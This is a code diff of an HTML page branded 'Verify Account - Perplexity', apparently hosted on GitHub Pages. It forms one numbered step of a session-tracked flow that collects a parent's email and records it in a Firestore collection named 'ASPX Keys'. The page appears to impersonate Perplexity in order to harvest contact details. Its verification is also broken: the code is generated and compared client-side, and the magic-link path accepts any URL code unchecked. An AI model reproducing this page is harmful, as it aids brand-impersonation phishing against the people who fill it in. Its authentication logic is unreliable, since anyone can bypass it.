@@ -3,83 +3,89 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verify - Perplexity</title>
-    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <title>Verify Account - Perplexity</title>
+    <!-- EmailJS SDK -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <style>
-        :root { --primary-bg: #fff; --text-main: #000; --accent: #202124; }
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: var(--primary-bg); display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; padding: 20px; text-align: center; }
+        :root { --main-black: #1a1a1a; --gray-text: #666; --border-color: #e5e5e5; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fff; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; color: var(--main-black); }
+        .wrapper { width: 90%; max-width: 420px; text-align: center; position: relative; padding-bottom: 50px; }
+        .close-icon { position: absolute; top: -40px; right: 0; background: #f5f5f5; border-radius: 50%; width: 34px; height: 34px; display: flex; align-items: center; justify-content: center; cursor: pointer; font-size: 18px; }
         
-        .container { max-width: 400px; width: 100%; }
-        .close-btn { position: absolute; top: 20px; right: 20px; cursor: pointer; background: #f0f0f0; border-radius: 50%; padding: 8px; width: 30px; height: 30px; display: flex; align-items: center; justify-content: center; }
+        /* SVG Animation */
+        .header-icon { margin-bottom: 30px; }
+        .plane-circle { stroke-dasharray: 283; stroke-dashoffset: 283; animation: dash 2s ease-in-out forwards; }
+        .plane-path { stroke-dasharray: 100; stroke-dashoffset: 100; animation: dash 1.5s 0.5s ease-in-out forwards; }
+        @keyframes dash { to { stroke-dashoffset: 0; } }
+
+        h1 { font-size: 38px; font-weight: 500; margin: 0 0 15px; letter-spacing: -0.5px; }
+        p { font-size: 16px; color: var(--gray-text); line-height: 1.5; margin-bottom: 30px; }
+        .email-label { font-weight: 600; color: #333; }
+
+        /* Inputs */
+        .otp-group { display: flex; justify-content: center; gap: 8px; margin-bottom: 30px; }
+        .otp-box { width: 54px; height: 72px; border: 1.5px solid var(--border-color); border-radius: 12px; font-size: 28px; text-align: center; outline: none; transition: border-color 0.2s; }
+        .otp-box:focus { border-color: var(--main-black); }
         
-        /* SVG Animation Styling */
-        .icon-box { position: relative; width: 100px; height: 100px; margin: 0 auto 20px; }
-        .plane-svg { width: 100%; height: 100%; stroke-dasharray: 1000; stroke-dashoffset: 1000; animation: draw 3s ease-in-out infinite; }
-        @keyframes draw { to { stroke-dashoffset: 0; } }
+        input[type="email"] { width: 100%; padding: 15px; border: 1.5px solid var(--border-color); border-radius: 10px; font-size: 16px; margin-bottom: 15px; box-sizing: border-box; }
 
-        h1 { font-size: 32px; font-weight: 500; margin-bottom: 10px; color: var(--text-main); }
-        p { color: #666; font-size: 15px; line-height: 1.5; margin-bottom: 30px; }
-        .email-display { font-weight: bold; color: #444; }
+        .btn-main { width: 100%; padding: 18px; background-color: #bebebe; color: white; border: none; border-radius: 10px; font-size: 16px; font-weight: 600; cursor: not-allowed; transition: background 0.3s; }
+        .btn-main.active { background-color: var(--main-black); cursor: pointer; }
 
-        /* OTP Input Styling */
-        .otp-container { display: flex; justify-content: center; gap: 10px; margin-bottom: 30px; }
-        .otp-input { width: 50px; height: 65px; border: 1px solid #ddd; border-radius: 12px; font-size: 24px; text-align: center; outline: none; background: #fff; }
-        .otp-input:focus { border-color: #000; box-shadow: 0 0 0 1px #000; }
-
-        input[type="email"] { width: 100%; padding: 15px; border-radius: 8px; border: 1px solid #ddd; margin-bottom: 15px; box-sizing: border-box; }
-
-        .btn-confirm { width: 100%; padding: 16px; background: #bebebe; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.3s; }
-        .btn-confirm.active { background: #1a1a1a; cursor: pointer; }
-        
+        #loading-overlay { position: fixed; top:0; left:0; width:100%; height:100%; background:white; display:flex; align-items:center; justify-content:center; z-index:100; }
         .hidden { display: none; }
-        #status-msg { margin-top: 15px; font-size: 13px; color: #d93025; }
     </style>
 </head>
 <body>
 
-<div class="close-btn" onclick="window.location.reload()">✕</div>
+<div id="loading-overlay">Checking status...</div>
 
-<div class="container">
-    <!-- Icon Section -->
-    <div class="icon-box">
-        <svg viewBox="0 0 100 100" class="plane-svg" fill="none" stroke="black" stroke-width="1.5">
-            <circle cx="50" cy="50" r="45" stroke="#eee" />
-            <path d="M30,50 L70,30 L60,70 L50,55 L30,50 Z M50,55 L70,30" />
-            <path d="M40,65 Q45,75 55,65" stroke-dasharray="4,4" />
+<div class="wrapper hidden" id="main-content">
+    <div class="close-icon" onclick="window.location.reload()">×</div>
+    
+    <div class="header-icon">
+        <svg width="120" height="120" viewBox="0 0 100 100">
+            <circle cx="50" cy="50" r="45" fill="none" stroke="#e5e5e5" stroke-width="1" />
+            <circle cx="50" cy="50" r="40" fill="none" stroke="#333" stroke-width="1.5" class="plane-circle" />
+            <path d="M35,50 L65,35 L58,65 L50,55 L35,50 Z" fill="none" stroke="#333" stroke-width="2" class="plane-path" />
+            <path d="M45,70 Q50,75 55,70" fill="none" stroke="#333" stroke-width="1" stroke-dasharray="3,3" />
         </svg>
     </div>
 
-    <div id="setup-view">
-        <h1>Verify Parental Access</h1>
-        <p>Enter your parent's email to receive a 4-digit verification code or magic link.</p>
+    <div id="step-1">
+        <h1>Parental Email</h1>
+        <p>This is a kids account. Please enter your parent's email to receive a sign-in link.</p>
         <input type="email" id="parentEmailInput" placeholder="parent@example.com">
-        <button class="btn-confirm active" id="sendBtn">Send Code</button>
+        <button id="sendEmailBtn" class="btn-main active">Send Link</button>
     </div>
 
-    <div id="verify-view" class="hidden">
+    <div id="step-2" class="hidden">
         <h1>Check your email</h1>
-        <p>A temporary sign-in link has been sent to <br><span class="email-display" id="targetEmail"></span></p>
+        <p>A temporary sign-in link has been sent to <br><span class="email-label" id="displayEmail"></span></p>
         
-        <div class="otp-container">
-            <input type="text" class="otp-input" maxlength="1" oninput="moveFocus(this, 0)">
-            <input type="text" class="otp-input" maxlength="1" oninput="moveFocus(this, 1)">
-            <input type="text" class="otp-input" maxlength="1" oninput="moveFocus(this, 2)">
-            <input type="text" class="otp-input" maxlength="1" oninput="moveFocus(this, 3)">
+        <div class="otp-group">
+            <input type="number" class="otp-box" maxlength="1" oninput="move(this, 0)">
+            <input type="number" class="otp-box" maxlength="1" oninput="move(this, 1)">
+            <input type="number" class="otp-box" maxlength="1" oninput="move(this, 2)">
+            <input type="number" class="otp-box" maxlength="1" oninput="move(this, 3)">
         </div>
 
-        <button class="btn-confirm" id="confirmBtn" disabled>Confirm</button>
+        <button id="confirmBtn" class="btn-main">Confirm</button>
     </div>
-    
-    <div id="status-msg"></div>
 </div>
 
 <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
     import { getFirestore, doc, getDoc, updateDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
+    // --- ADD YOUR FIREBASE CONFIG HERE ---
     const firebaseConfig = {
+        apiKey: "YOUR_API_KEY",
+        authDomain: "YOUR_AUTH_DOMAIN",
         projectId: "question-metabase",
-        // Add your other config keys here...
+        storageBucket: "YOUR_STORAGE_BUCKET",
+        messagingSenderId: "YOUR_SENDER_ID",
+        appId: "YOUR_APP_ID"
     };
 
     const app = initializeApp(firebaseConfig);
@@ -89,98 +95,119 @@
     const urlParams = new URLSearchParams(window.location.search);
     const sessionId = urlParams.get('session');
     const magicCode = urlParams.get('code');
-    const pEmail = urlParams.get('pEmail');
+    const magicEmail = urlParams.get('pemail') || urlParams.get('pEmail'); // Checks both cases
 
     let correctOtp = "";
 
     async function init() {
-        if (!sessionId) return;
-
-        // --- Handle Magic Link ---
-        if (magicCode && pEmail) {
-            document.getElementById('setup-view').innerHTML = "<h1>Verifying link...</h1>";
-            await finalize(pEmail);
+        if (!sessionId) {
+            alert("No Session ID provided in URL.");
             return;
         }
 
-        // --- Fetch Session Data ---
-        const docRef = doc(db, "ASPX Keys", sessionId);
-        const snap = await getDoc(docRef);
-        if (snap.exists()) {
-            const data = snap.data();
-            if (data.family === "no" || data.family === "busniess") {
-                window.location.href = "6.html";
+        // 1. Check for Magic Link logic first
+        if (magicCode && magicEmail) {
+            document.getElementById('loading-overlay').innerText = "Verifying link...";
+            await completeFlow(magicEmail);
+            return;
+        }
+
+        // 2. Regular check for database conditions
+        try {
+            const docRef = doc(db, "ASPX Keys", sessionId);
+            const snap = await getDoc(docRef);
+            
+            if (snap.exists()) {
+                const data = snap.data();
+                
+                // If family is no or business, skip to 6.html
+                if (data.family === "no" || data.family === "busniess") {
+                    window.location.href = "6.html";
+                    return;
+                }
+
+                // Show UI for Kids/Commit accounts
+                document.getElementById('loading-overlay').classList.add('hidden');
+                document.getElementById('main-content').classList.remove('hidden');
+            } else {
+                alert("Session not found in database.");
             }
+        } catch (e) {
+            console.error("Firebase Error:", e);
         }
     }
 
-    document.getElementById('sendBtn').onclick = async () => {
+    // Send Email Logic
+    document.getElementById('sendEmailBtn').onclick = async () => {
         const email = document.getElementById('parentEmailInput').value;
-        if (!email.includes('@')) return alert("Enter valid email");
+        if (!email.includes('@')) return alert("Enter a valid email");
 
         correctOtp = Math.floor(1000 + Math.random() * 9000).toString();
         
-        const params = {
+        // IMPORTANT: Ensure your EmailJS template link is: 
+        // https://knox-app.github.io/cloud/dsk/5.html?session={{session}}&code={{otp}}&pemail={{email}}
+        const templateParams = {
             email: email,
             session: sessionId,
             otp: correctOtp
         };
 
         try {
-            await emailjs.send('service_1ij08zn', 'template_qxz1wka', params);
-            document.getElementById('setup-view').classList.add('hidden');
-            document.getElementById('verify-view').classList.remove('hidden');
-            document.getElementById('targetEmail').innerText = email;
-        } catch (e) {
-            alert("Error sending email. Check console.");
+            document.getElementById('sendEmailBtn').innerText = "Sending...";
+            await emailjs.send('service_1ij08zn', 'template_qxz1wka', templateParams);
+            
+            document.getElementById('step-1').classList.add('hidden');
+            document.getElementById('step-2').classList.remove('hidden');
+            document.getElementById('displayEmail').innerText = email;
+        } catch (err) {
+            alert("Email failed to send. Check console for details.");
+            console.error(err);
+            document.getElementById('sendEmailBtn').innerText = "Send Link";
         }
     };
 
-    // UI Input Logic
-    window.moveFocus = (el, index) => {
-        if (el.value.length === 1 && index < 3) {
-            document.querySelectorAll('.otp-input')[index + 1].focus();
+    // OTP Input UI Logic
+    window.move = (el, idx) => {
+        if (el.value.length >= 1 && idx < 3) {
+            document.querySelectorAll('.otp-box')[idx + 1].focus();
         }
-        checkInputs();
-    };
-
-    function checkInputs() {
-        const inputs = document.querySelectorAll('.otp-input');
-        const code = Array.from(inputs).map(i => i.value).join('');
+        const code = Array.from(document.querySelectorAll('.otp-box')).map(i => i.value).join('');
         const btn = document.getElementById('confirmBtn');
         if (code.length === 4) {
             btn.classList.add('active');
             btn.disabled = false;
+            btn.style.cursor = "pointer";
         } else {
             btn.classList.remove('active');
             btn.disabled = true;
         }
-    }
+    };
 
     document.getElementById('confirmBtn').onclick = async () => {
-        const entered = Array.from(document.querySelectorAll('.otp-input')).map(i => i.value).join('');
+        const entered = Array.from(document.querySelectorAll('.otp-box')).map(i => i.value).join('');
         if (entered === correctOtp) {
-            await finalize(document.getElementById('targetEmail').innerText);
+            await completeFlow(document.getElementById('displayEmail').innerText);
         } else {
-            alert("Incorrect code");
+            alert("The code you entered is incorrect.");
         }
     };
 
-    async function finalize(parentEmail) {
+    async function completeFlow(pEmailValue) {
         try {
             const docRef = doc(db, "ASPX Keys", sessionId);
             await updateDoc(docRef, {
                 family: "commited",
-                guardians: parentEmail,
-                updatedAt: new Date().toISOString()
+                guardians: pEmailValue,
+                updatedAt: new Date().toLocaleString()
             });
             window.location.href = "6.html";
         } catch (e) {
-            console.error(e);
+            alert("Error updating record: " + e.message);
         }
     }
 
     init();
 </script>
+
 </body>
 </html>
